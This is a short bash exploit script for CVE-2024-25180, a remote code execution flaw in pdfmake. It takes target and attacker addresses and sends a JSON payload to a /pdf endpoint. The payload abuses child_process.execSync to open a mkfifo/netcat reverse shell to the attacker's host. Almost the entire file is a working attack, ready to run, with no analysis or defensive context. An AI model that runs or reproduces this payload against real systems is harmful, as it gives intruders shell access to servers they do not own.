#!/bin/bash

# ======================================
#   CVE-2024-25180 Remote Code Execution in pdfmake
# ======================================

target_ip=$1
target_port=$2
local_ip=$3
local_port=$4

banner=$(cat << 'EOF'
_____________   _______________         _______________   ________    _____           ________   .____________  ______ _______   
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \  /  |  |          \_____  \  |   ____/_   |/  __  \\   _  \  
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ /   |  |_  ______  /  ____/  |____  \ |   |>      </  /_\  \ 
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \/    ^   / /_____/ /       \  /       \|   /   --   \  \_/   \
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \____   |          \_______ \/______  /|___\______  /\_____  /
        \/                  \/                  \/     \/         \/    |__|                  \/       \/            \/       \/ 
EOF
)

if [ $# -ne 4 ]; then
    echo "$banner"
    echo "Usage: $0 <TARGET_IP> <TARGET_PORT> <LOCAL_IP> <LOCAL_PORT>"
    exit 1
fi

curl --path-as-is -s -k -X 'POST' \
    -H 'Content-Type: application/json' \
    --data-binary "{\"content\": \"this.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $local_ip $local_port >/tmp/f').toString(); const dd = 2\"}" \
    "http://$target_ip:$target_port/pdf" \
    2>/dev/null
